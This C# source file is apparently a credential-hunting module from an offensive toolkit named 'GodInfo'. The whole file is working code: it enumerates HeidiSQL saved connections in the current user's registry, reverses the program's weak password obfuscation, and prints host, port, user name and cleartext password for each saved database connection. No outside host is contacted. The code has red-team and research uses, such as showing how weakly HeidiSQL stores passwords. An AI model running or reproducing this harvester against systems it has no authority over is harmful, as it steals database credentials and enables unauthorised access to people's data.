using GodInfo.Utils;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;

namespace GodInfo.Commands
{
    public class HeidiSQLCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            public string ServerName;
            public string ServiceType;
            public string Host;
            public string Port;
            public string UserName;
            public string Password;
        }

        private static readonly Dictionary<int, string> ServiceTypes = new Dictionary<int, string>()
        {
            {0, "mysql"},
            {1, "mysql-named-pipe"},
            {2, "mysql-ssh"},
            {3, "mssql-named-pipe"},
            {4, "mssql"},
            {5, "mssql-spx-ipx"},
            {6, "mssql-banyan-vines"},
            {7, "mssql-windows-rpc"},
            {8, "postgres"},
        };

        private const string RegistryPath = @"Software\HeidiSQL\Servers";

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by HeidiSQL.");
            GetHeidiSQLCred();
        }

        public static void GetHeidiSQLCred()
        {
            Logger.TaskHeader("Hunting HeidiSQL", 1);
            
            if (!CheckHeidiSQLCredExists())
            {
                Logger.WriteLine("[-] No HeidiSQL installation or saved connections found.");
                return;
            }

            // 从注册表获取HeidiSQL凭据
            GetCredentialsFromRegistry();
        }

        public static bool CheckHeidiSQLCredExists()
        {
            // 检查注册表中是否存在HeidiSQL凭据
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(RegistryPath))
            {
                if (registryKey == null)
                {
                    return false;
                }

                return registryKey.GetSubKeyNames().Length > 0;
            }
        }

        private static void GetCredentialsFromRegistry()
        {
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(RegistryPath))
            {
                if (registryKey == null)
                {
                    Logger.WriteLine($"[-] HeidiSQL registry key not found: HKEY_CURRENT_USER\\{RegistryPath}");
                    return;
                }

                Logger.WriteLine($"[+] Found HeidiSQL registry key: HKEY_CURRENT_USER\\{RegistryPath}");
                
                List<ConnectionInfo> connections = new List<ConnectionInfo>();
                bool foundAnyCredentials = false;

                foreach (string subKeyName in registryKey.GetSubKeyNames())
                {
                    using (RegistryKey subKey = Registry.CurrentUser.OpenSubKey(Path.Combine(RegistryPath, subKeyName)))
                    {
                        if (subKey == null) continue;

                        string host = subKey.GetValue("Host", "").ToString();
                        string user = subKey.GetValue("User", "").ToString();
                        string port = subKey.GetValue("Port", "").ToString();
                        int dbType = Convert.ToInt32(subKey.GetValue("NetType", 0));
                        int prompt = Convert.ToInt32(subKey.GetValue("LoginPrompt", 0));
                        int winAuth = Convert.ToInt32(subKey.GetValue("WindowsAuth", 0));
                        string encryptedPassword = subKey.GetValue("Password", "").ToString();

                        // 跳过Windows身份验证的连接
                        if (dbType > 3 && dbType < 7 && winAuth == 1) continue;
                        // 跳过需要手动输入密码的连接
                        if (string.IsNullOrEmpty(encryptedPassword) || encryptedPassword.Length == 1 || prompt == 1) continue;

                        string decryptedPassword = DecryptPassword(encryptedPassword);
                        string serviceType = ServiceTypes.ContainsKey(dbType) ? ServiceTypes[dbType] : $"Unknown({dbType})";

                        connections.Add(new ConnectionInfo
                        {
                            ServerName = subKeyName,
                            ServiceType = serviceType,
                            Host = host,
                            Port = port,
                            UserName = user,
                            Password = decryptedPassword
                        });
                        
                        foundAnyCredentials = true;
                    }
                }

                if (foundAnyCredentials)
                {
                    Logger.PrintTableFromStructs(connections);
                }
                else
                {
                    Logger.WriteLine("[-] No saved HeidiSQL credentials found.");
                }
            }
        }

        private static string DecryptPassword(string encryptedPassword)
        {
            try
            {
                if (string.IsNullOrEmpty(encryptedPassword) || encryptedPassword.Length <= 1)
                {
                    return string.Empty;
                }

                // 获取最后一位数字（密钥）
                int key = Convert.ToInt32(encryptedPassword[encryptedPassword.Length - 1].ToString());
                // 删除最后一位
                string hexString = encryptedPassword.Substring(0, encryptedPassword.Length - 1);
                
                // 十六进制字符串转换为字节数组
                byte[] encryptedBytes = HexToBytes(hexString);
                
                // 解密
                for (int i = 0; i < encryptedBytes.Length; i++)
                {
                    encryptedBytes[i] = (byte)(encryptedBytes[i] - key);
                }
                
                return Encoding.UTF8.GetString(encryptedBytes);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error decrypting HeidiSQL password: {ex.Message}");
                return "[解密失败]";
            }
        }

        private static byte[] HexToBytes(string hexString)
        {
            byte[] bytes = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            }
            return bytes;
        }
    }
} 